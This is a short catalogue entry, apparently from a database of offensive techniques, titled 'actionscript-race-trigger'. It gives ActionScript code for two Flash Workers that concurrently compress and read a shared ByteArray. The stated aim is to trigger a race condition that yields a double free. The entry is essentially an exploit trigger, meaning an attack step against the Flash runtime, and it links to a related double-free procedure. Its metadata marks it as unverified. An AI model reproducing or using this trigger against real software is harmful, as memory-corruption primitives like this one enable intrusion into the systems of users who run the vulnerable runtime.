---
id: c3f4g5h6-i7j8-9013-fghi-678901234567
data: >-
  // Worker1: byteArray.compress(CompressionAlgorithm.DEFLATE); // Worker2: var
  byteArray:ByteArray = Worker.current.getSharedProperty("byteArray");
  byteArray.position = 0; byteArray.readByte();
tags:
  - race-condition
  - trigger
type: command
output: null
executor: actionscript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:18.599Z'
verified: false
validated: true
submitted: true
---
# actionscript-race-trigger

## Command

```actionscript
// In Worker1
byteArray.compress(CompressionAlgorithm.DEFLATE);

// In Worker2
import flash.utils.ByteArray;
var byteArray:ByteArray = Worker.current.getSharedProperty("byteArray");
byteArray.position = 0;
byteArray.readByte();
```

## Description

ActionScript snippets to trigger the race condition by compressing and accessing the shared ByteArray concurrently.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `compress` | Compression method | Yes |
| `readByte` | Access operation | Yes |

## Examples

### Basic Usage

```actionscript
byteArray.compress();
byteArray.readByte();
```

## Expected Output

Double free due to unsynchronized access.

## Related

- [[Related Procedure: Trigger-Race-Condition-Double-Free]]
